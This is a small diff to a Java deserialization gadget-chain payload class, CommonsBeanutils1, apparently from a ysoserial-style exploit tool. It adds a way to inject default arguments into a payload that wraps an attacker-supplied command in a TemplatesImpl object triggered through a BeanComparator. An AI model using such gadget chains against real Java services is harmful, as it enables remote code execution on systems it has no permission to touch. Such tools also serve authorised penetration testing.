@@ -12,6 +12,8 @@ import org.apache.commons.beanutils.BeanComparator;
  */
 public class CommonsBeanutils1 implements Payload {
 
+	private String[] args;
+
 	/**
 	 *
 	 * @param args
@@ -23,6 +25,8 @@ public class CommonsBeanutils1 implements Payload {
 	 */
 	@Override
 	public Object getPayload(String[] args) throws Exception {
+		if (this.args != null)
+			args = this.args;
 		final Object templates = Gadgets.createTemplatesImpl(args[0]);
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("lowestSetBit");
@@ -43,4 +47,10 @@ public class CommonsBeanutils1 implements Payload {
 
 		return queue;
 	}
+
+	@Override
+	public void injectDefaultArgs(String[] args) {
+		this.args = args;
+	}
+
 }
